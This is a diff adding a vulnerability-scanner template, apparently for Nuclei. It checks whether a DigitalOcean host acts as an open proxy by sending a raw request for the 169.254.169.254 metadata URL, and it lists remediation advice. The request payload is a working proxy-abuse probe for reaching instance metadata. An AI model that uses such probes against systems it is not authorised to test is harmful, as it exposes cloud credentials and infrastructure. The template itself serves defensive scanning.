@@ -1,0 +1,44 @@
+id: metadata-service-digitalocean
+
+# This attack abuses a misconfigured proxy that allows access to the metadata
+# IP or a name which resolves to the IP. A standard proxy request is made to
+# the proxy using the full metadata URL, which the proxy will fulfill to its
+# own metadata service.
+#
+# The proxy may also be vulnerable to host/port enumeration on localhost or
+# inside the private network.
+info:
+  name: DigitalOcean Metadata Service Check
+  author: sullo
+  severity: critical
+  description: The DigitalOcean host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
+  remediation: Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.
+  reference:
+    - https://developers.digitalocean.com/documentation/metadata/
+    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
+    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-441
+  metadata:
+    max-request: 2
+  tags: exposure,config,digitalocean,proxy,misconfig,metadata
+
+http:
+  - raw:
+      - |+
+        GET http://{{hostval}}/metadata/v1.json HTTP/1.1
+        Host: {{hostval}}
+
+    payloads:
+      hostval:
+        - aws.oast.online
+        - 169.254.169.254
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "droplet_id"
+# digest: 4a0a0047304502203302738399c77c9807e3397a374a62b146579a9725a4098b50d8a5be5ce7b55a0221009e8efc56133186d63242e1468545b31aa6a9ac15178844e652357fc255d0760b:922c64590222798bb761d5b6d8e72950
